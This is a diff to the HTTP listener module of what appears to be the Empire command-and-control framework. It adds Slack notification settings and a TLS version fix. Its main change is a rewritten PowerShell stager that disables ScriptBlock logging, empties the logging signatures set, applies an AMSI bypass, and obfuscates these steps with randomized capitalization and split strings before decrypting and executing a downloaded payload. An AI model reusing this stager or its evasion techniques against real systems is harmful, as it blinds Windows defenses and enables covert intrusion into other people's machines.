@@ -107,6 +107,16 @@ class Listener:
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -170,17 +180,24 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
-                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
@@ -188,6 +205,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 # TODO: reimplement stager retries?
@@ -227,7 +245,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -612,7 +630,16 @@ class Listener:
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
-                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+
+                # support any version of tls
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
